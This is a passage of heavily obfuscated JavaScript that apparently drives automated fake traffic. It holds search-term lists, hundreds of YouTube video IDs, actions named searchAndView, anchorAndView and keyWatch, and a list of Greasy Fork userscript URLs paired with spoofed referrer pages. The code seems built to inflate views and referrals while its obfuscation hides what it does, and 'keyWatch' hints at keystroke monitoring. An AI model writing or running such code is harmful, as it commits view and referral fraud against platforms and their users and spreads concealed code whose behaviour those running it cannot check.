'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')[a0(0xe)](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](-0x42 * 0x6b + 0x1 * -0x21a1 + 0x3d41)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](0x13c8 + 0x1c97 + -0x3055)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](-0x2 * -0xe8f + -0x1cef + -0x16 * 0x2);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    a0(0x17) + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    Z(0x19, 'JTOm') + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    Y(0x12) + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    Z(0x1a, 'N[jk') + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    Y(0x0) + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    Y(0x10) + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    a0(0x11) + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + a0(0x1b) + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + Y(0x6) + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + Z(0x1d, 'ZNY3'),
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + Z(0x1e, 'M@#Z') + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': Z(0xb, 'KL&V') + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + Y(0x15) + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + a0(0x1) + 'pts/by-sit' + 'e/mope.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + Y(0x9) + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
